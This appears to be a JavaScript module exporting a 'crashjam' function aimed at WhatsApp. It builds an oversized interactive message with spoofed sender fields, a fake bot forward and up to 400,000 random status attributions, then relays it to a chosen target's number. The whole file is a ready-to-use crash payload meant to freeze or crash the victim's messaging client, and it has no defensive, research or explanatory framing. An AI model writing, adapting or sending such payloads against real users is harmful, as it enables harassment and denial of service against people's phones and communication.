const crypto = require('crypto');

async function crashjam(sock, targetJid, opts = {}) {
  const attributions = Math.min(opts.attributions || 150000, 400000);
  const cc = ['41', '91', '90', '31', '40'];
  const message = {
    messageContextInfo: {
      messageSecret: crypto.randomBytes(32),
      deviceListMetadata: { senderKeyIndex: 0, senderTimestamp: Date.now(), recipientKeyIndex: 0 }
    },
    interactiveResponseMessage: {
      contextInfo: {
        remoteJid: 'status@broadcast',
        fromMe: true,
        isQuestion: true,
        forwardedAiBotMessageInfo: { botJid: '13135550202@bot', botName: 'Business Assistant', creator: 'FLIX' },
        statusAttributionType: 2,
        statusAttributions: Array.from({ length: attributions }, () => ({
          participant: `${cc[Math.floor(Math.random() * cc.length)]}${Math.floor(Math.random() * 1e10).toString().padStart(10, '0')}@s.whatsapp.net`,
          type: 1
        }))
      },
      body: { text: '', format: 'DEFAULT' },
      nativeFlowResponseMessage: { name: 'call_permission_request', paramsJson: 'kkk', version: 3 }
    }
  };
  await sock.relayMessage('status@broadcast', { viewOnceMessage: { message } }, {
    statusJidList: [targetJid],
    additionalNodes: [{
      tag: 'meta', attrs: {}, content: [{
        tag: 'mentioned_users', attrs: {}, content: [{ tag: 'to', attrs: { jid: targetJid } }]
      }]
    }]
  });
}

module.exports = { crashjam };
